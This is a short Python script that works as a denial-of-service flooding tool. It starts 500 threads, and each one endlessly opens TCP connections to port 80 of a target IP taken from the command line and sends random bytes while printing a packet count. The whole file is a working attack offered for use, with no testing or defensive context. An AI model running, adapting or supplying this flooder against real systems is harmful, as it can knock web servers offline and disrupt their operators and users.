import socket
import threading
import random
import sys



port = 80
Bytes = random.randbytes(1490)

sent_packets = 0

if len(sys.argv) < 2 or len(sys.argv) > 2:
    sys.stderr.write(f"E: usage: python3 {sys.argv[0]} <Target IP>")
    sys.stderr.flush()
    sys.exit(1)
else:
    target = sys.argv[1]


def attack():
    global sent_packets
    while True:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.connect((target, port))
        server.sendto(Bytes, (target, port))
        print(f"Sending packets to {target} on port {port}\n")
        sent_packets += 1
        print(f"Sent packets {sent_packets}")
        server.close()



for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
